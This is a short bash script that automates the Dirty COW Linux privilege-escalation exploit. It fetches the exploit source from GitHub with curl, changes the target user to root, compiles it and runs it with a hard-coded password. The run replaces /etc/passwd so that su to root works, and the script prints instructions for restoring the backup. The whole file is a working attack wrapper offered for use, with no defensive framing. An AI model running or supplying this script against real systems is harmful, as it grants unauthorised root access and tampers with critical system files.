#!/bin/bash

USER=root
PASSWORD=4242

SRC=dirty.c
COWNAME=dirty

curl -ks "https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c" > $SRC

sed -i "s/firefart/$USER/g" $SRC

gcc $SRC -o $COWNAME -lcrypt -lpthread

echo "Wait a minute and try access root with su ($USER:$PASSWORD)"
echo "To restore use: mv /tmp/passwd.bak /etc/passwd"

./$COWNAME $PASSWORD